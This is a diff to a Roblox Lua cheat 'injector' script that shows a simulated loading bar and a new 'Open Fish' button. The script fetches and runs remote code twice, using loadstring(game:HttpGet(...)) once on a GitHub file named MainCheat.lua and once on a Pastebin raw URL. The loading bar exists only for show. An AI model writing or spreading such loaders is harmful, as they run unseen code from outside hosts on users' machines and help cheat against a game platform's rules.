@@ -91,52 +91,37 @@ progressLabel.Font = Enum.Font.GothamBold
 progressLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 progressLabel.Parent = loadingBarBg
 
--- Create Pop-up Frame for 50% Progress
-local popupFrame = Instance.new("Frame")
-popupFrame.Size = UDim2.new(0.3, 0, 0.15, 0)
-popupFrame.Position = UDim2.new(0.5, 0, 0.7, 0)
-popupFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-popupFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-popupFrame.BackgroundTransparency = 0.5
-popupFrame.Visible = false
-popupFrame.Parent = screenGui
+-- Create "Open Fish" Button (Initially Hidden)
+local fishButton = Instance.new("TextButton")
+fishButton.Size = UDim2.new(0.8, 0, 0.3, 0)
+fishButton.Position = UDim2.new(0.1, 0, 0.5, 0)
+fishButton.Text = "Open Fish"
+fishButton.TextScaled = true
+fishButton.Font = Enum.Font.GothamBold
+fishButton.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+fishButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+fishButton.BorderSizePixel = 0
+fishButton.Visible = false
+fishButton.Parent = mainFrame
 
--- Add Rounded Corners to Pop-up
-local popupCorner = Instance.new("UICorner")
-popupCorner.CornerRadius = UDim.new(0, 8)
-popupCorner.Parent = popupFrame
-
--- Create Pop-up Text Label
-local popupLabel = Instance.new("TextLabel")
-popupLabel.Size = UDim2.new(1, -20, 1, -20)
-popupLabel.Position = UDim2.new(0, 10, 0, 10)
-popupLabel.BackgroundTransparency = 1
-popupLabel.Text = "Fish Features are only for VIP+++\nDevelopers or Paid Promotion Youtubers!"
-popupLabel.TextScaled = true
-popupLabel.Font = Enum.Font.GothamBold
-popupLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
-popupLabel.Parent = popupFrame
+-- Add Rounded Corners to Fish Button
+local fishButtonCorner = Instance.new("UICorner")
+fishButtonCorner.CornerRadius = UDim.new(0, 6)
+fishButtonCorner.Parent = fishButton
 
 -- Functions for Injecting
 local function startInjecting()
     -- Simulate loading process
-    local totalTime = 5  -- Adjust the time as needed
+    local totalTime = 5
     local startTime = tick()
     while tick() - startTime < totalTime do
         local progress = (tick() - startTime) / totalTime
         innerLoadingBar.Size = UDim2.new(progress, 0, 1, 0)
         progressLabel.Text = math.floor(progress * 100) .. "%"
-        
-        -- Show pop-up at 50% progress
-        if math.floor(progress * 100) == 50 then
-            popupFrame.Visible = true
-            wait(10) -- Show for 10 seconds
-            popupFrame.Visible = false
-        end
         wait(0.1)
     end
 
-    -- After 100% progress, run the code (loadstring)
+    -- After 100% progress, run the main cheat
     local success, errorMessage = pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/UniDCYT/Dolhin-Tsb-Private-Cheat/refs/heads/main/MainCheat.lua"))()
     end)
@@ -148,7 +133,24 @@ local function startInjecting()
         print("Error during injection: " .. errorMessage)
     end
 
-    -- Close the UI after injection is done
+    -- Show the "Open Fish" button for 10 seconds
+    injectButton.Visible = false
+    fishButton.Visible = true
+
+    local fishButtonClicked = false
+    fishButton.MouseButton1Click:Connect(function()
+        fishButtonClicked = true
+        loadstring(game:HttpGet("https://pastebin.com/raw/N4weEdmM"))()
+    end)
+
+    -- Wait for 10 seconds or until "Open Fish" is clicked
+    local waitTime = 10
+    while waitTime > 0 and not fishButtonClicked do
+        wait(1)
+        waitTime = waitTime - 1
+    end
+
+    -- Close the UI after 10 seconds or once the fish script is run
     screenGui.Enabled = false
 end
 
